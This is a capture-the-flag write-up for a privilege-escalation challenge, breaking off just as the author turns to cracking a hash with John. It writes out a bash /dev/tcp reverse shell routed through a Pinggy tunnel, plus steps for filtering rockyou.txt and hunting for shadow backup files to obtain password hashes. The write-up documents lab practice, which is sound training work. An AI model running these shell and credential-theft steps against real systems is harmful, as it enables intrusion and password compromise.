escalation  
Category: Misc/Privilege Escalation  

Description:  Can you climb to the top?  

Link to the challenge: https://app.cyber-edu.co/challenges/98d79d66-d80f-48fb-a865-dd5e563be6b6?tenant=unbreakable  

For this ctf, we have a Linux instance with a web shell, but I need to reverse shell to complete the challenge, because the challenge couldn't be done using the web shell.  

To do reverse shell, we have to create a pair of ssh keys using `ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/id_rsa` command.  
After that, we need to use `nc -lvnp 4444` to listen to the upcoming connexions.  
Then, we are gonna use Pinggy to reverse shell on port 4444 using `ssh -R 80:localhost:4444 tcp@a.pinggy.io -p 443` command.  
Now we should get a link, something like `tcp://uggrp-<Your IP>.run.pinggy-free.link:45745`  
And for the last step, we have to run `bash -c 'bash -i >& /dev/tcp/etfmd-<Your IP>.run.pinggy-free.link/45745 0>&1` command.  
And now we should see in the terminal with the nc connexion our shell.  

After listing the files, we see a file called note.txt. Let's read it

`I got unauthorized access to some hashes but my PC is too low-end to crack them. I hid them safely in the server, but I'm sure you can find them.`  
`What are you waiting now? Crack away!`  
`Oh, and if this helps, user2 can't shut up about cherries... I don't know what's gotten into him but he started to become annoying as hell. Please start with him!`  
`And when you crack him down, don't forget to upgrade your shell!`  

Already got a hint, the password must contain some word about cherries. Let's use grep and the rockyou.txt wordlist to separate the passwords that have "cherries" in them.  
`grep -Ei "cherry|cherries" /usr/share/wordlists/rockyou.txt > cherry.txt`  

Now we need to find user2's password hash, in the shadow file. But we can't read it. Let's use `find / -name "*shadow*" 2> /dev/null` to find all the files which can contain the password hash.  
We found `shadow.bak` in `/opt/.../`, And after reading it we can find the hash. Now let's crack it  

For cracking the hash, we are gonna use John. 
